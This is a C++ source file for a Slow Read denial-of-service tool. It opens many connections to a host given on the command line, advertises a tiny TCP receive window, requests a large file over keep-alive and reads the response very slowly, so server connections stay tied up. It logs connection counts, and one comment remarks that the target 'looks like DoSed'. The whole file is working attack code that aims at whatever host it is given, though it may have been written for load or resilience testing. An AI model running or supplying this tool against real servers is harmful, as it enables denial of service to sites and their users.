#include <stdio.h>
#include <ctime>
#include <sys/time.h>
#include <iostream>
#include <new>

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

#define WINSIZE 1024
#define PORT 80

using namespace std;

class slowsocket {

    private:
        int fd;
        int id;
        time_t lastRead;
        int readInterval;
        int windowSize;
        char* readbuf;
        char* host;
        bool connectionEstablished;
    
    public:

        static int pendingConns;
        static int inService;
        static int closedSocks;

        slowsocket(int windSize, char* host, int readInterval, int id) {
            this->windowSize = windSize;
            this->host = host;
            this->connectionEstablished = false;
            // Allocate 1 MB size buffer
            this->readbuf = new char[1024*1024];
            this->readInterval = readInterval;
            this->lastRead = time(NULL);
            this->id = id;
        }

        bool connectAndSendRequest() {

            struct sockaddr_in serv_addr;
            struct hostent *server;

            server = gethostbyname(host);
            int portno = PORT;

            if (server == NULL) {
                printf("ERROR, no such host; Errno: %d; Detail: %s\n", h_errno, strerror(h_errno));
                return false;
            }

            bzero((char *) &serv_addr, sizeof(serv_addr));
            serv_addr.sin_family = AF_INET;
            bcopy((char *)server->h_addr, 
                 (char *)&serv_addr.sin_addr.s_addr,
                 server->h_length);
            serv_addr.sin_port = htons(portno);

            fd = socket(AF_INET, SOCK_STREAM, 0);

            if (fd < 0) {
                printf("ERROR opening socket\n");
                return false;
            }

            int arg = fcntl(fd, F_GETFL, NULL);
            arg |= O_NONBLOCK;
            fcntl(fd, F_SETFL, arg);  

            int ret = setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &windowSize, sizeof(windowSize));
            //char* req = "GET /photo.jpg HTTP/1.1\r\n"
            //char* req = "GET /junkText.txt HTTP/1.1\r\n"
            char* req = "GET /junkText_600kb.txt HTTP/1.1\r\n"
                        "HOST: localhost\r\n"
                        "Connection: keep-alive\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.106 Chrome/15.0.874.106 Safari/535.2\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Referer: http://localhost/index.php\r\n"
                        "Accept-Encoding: gzip,deflate,sdch\r\n"
                        "Accept-Language: en-US,en;q=0.8\r\n"
                        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
                        "\r\n";
                         
            //printf("waiting for server....\n");
            bool retry = false;

            while (1) {
                //usleep(10 * 1000);
                if (connect(fd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) {
                    if (!retry) {
                        //printf("Failed to connect; Will try after 1 sec\n");
                        //usleep(100 * 1000);
                        retry = true;
                    }
                    else {
                        //printf("Failed to connect on retry attempt\n");
                        return false;
                    }
                }
                else {
                    break;
                }
            }
            //printf("Connected to server\n");
            connectionEstablished = true;
            if (send(fd, req, strlen(req), 0) < 0) {
                printf("Failed to send the data; Connection established though\n");
            }

            return true;
        }

        bool isConnected() {
            return connectionEstablished;
        }

        void closeSocket() {
            close(fd);
            connectionEstablished = false;
        }

        bool readData() {
            time_t currentTime;
            currentTime = time(NULL);

            //printf("Time since last read: %d\n", ((int)difftime(currentTime, lastRead)));
            if (((int)difftime(currentTime, lastRead)) > readInterval) {
                //printf("Time since last read: %d\n", ((int)difftime(currentTime, lastRead)));
                //printf("Gonna read from socket\n");
                int readBytes = recv(fd, readbuf, 1024*1024, 0); 
                //int readBytes = recv(fd, readbuf, 900, 0); 
                if (readBytes == 0) {
                    fprintf(stdout, "No more data available in the socket; Closing the connection\n");
                    closeSocket();
                    slowsocket::closedSocks += 1;
                    slowsocket::inService -= 1;
                }
                else {
                    printf("Connection %d read %d bytes\n", id, readBytes);
                }

                lastRead = time(NULL);
                return true;
            }
            else {
             //   printf("Not reading this time\n");
                return false;
            }
        }

        int getfd() {
            return fd;
        }
};

int slowsocket::pendingConns = 0;
int slowsocket::inService = 0;
int slowsocket::closedSocks = 0;

void printStats(int timeSinceBeginning) {
    fprintf(stderr, "%4d\t%4d\t%4d\t%4d\n", timeSinceBeginning, slowsocket::pendingConns, slowsocket::inService, slowsocket::closedSocks);
}

int main(int argc, char** argv) {

    printf("%s <hostname> <readinterval> <numconn> <testduration> <windsizeinKB> <rate>\n", argv[0]);
    char* hostName = argv[1];
    int readInterval = atoi(argv[2]);
    int numConnections = atoi(argv[3]);
    int testDuration = atoi(argv[4]);
    int windSize = atoi(argv[5]);
    int delayInConnecting = 1000000/atoi(argv[6]);
    int numConnected = 0;
    slowsocket** fds = new slowsocket*[numConnections];

    slowsocket::pendingConns = numConnections;
    slowsocket::inService = 0;
    slowsocket::closedSocks = 0;
    
    time_t startTime, lastReportTime;
    time(&startTime);
    time(&lastReportTime);
    time_t currentTime;

    while(true) {
    
        time(&currentTime);

        // report the stats every second
        if (((int)difftime(currentTime, lastReportTime)) >= 5) {
            printStats(((int)difftime(lastReportTime, startTime)));
            lastReportTime = currentTime;
        }

        if (((int)difftime(currentTime, startTime)) > testDuration) {
            printf("Test duration over; Exiting....\n");
            break;
        }

        if (numConnected < numConnections) {
            fds[numConnected] = new slowsocket(windSize, hostName, readInterval, numConnected);
            //printf("Trying to connect client: %d\n", numConnected+1);
            if (!(fds[numConnected]->connectAndSendRequest())) {
                //printf("Unable to establish connection for client %d; Looks like DoSed\n", numConnected+1);
            }
            else {
                printf("Successfully connected client: %d\n", numConnected+1);
                slowsocket::inService += 1;
                slowsocket::pendingConns -= 1;
                numConnected++;
            }
        }

        bool isAtleastOneOpen = false;
        for (int i=0; i<numConnected; i++) {
            if (fds[i]->isConnected()) {
                //printf("open here\n");
                fds[i]->readData();
                isAtleastOneOpen = true;
            }
        }

        // exit while loop if there are no open connections
        if (!isAtleastOneOpen) {
            break;
        }
        usleep(delayInConnecting);
    }

    printf("Closing the sockets\n");
    for (int i = 0; i<numConnected; i++) {
        if (fds[i] -> isConnected()) {
            fds[i] -> closeSocket();
        }
    }
    return 0;
}
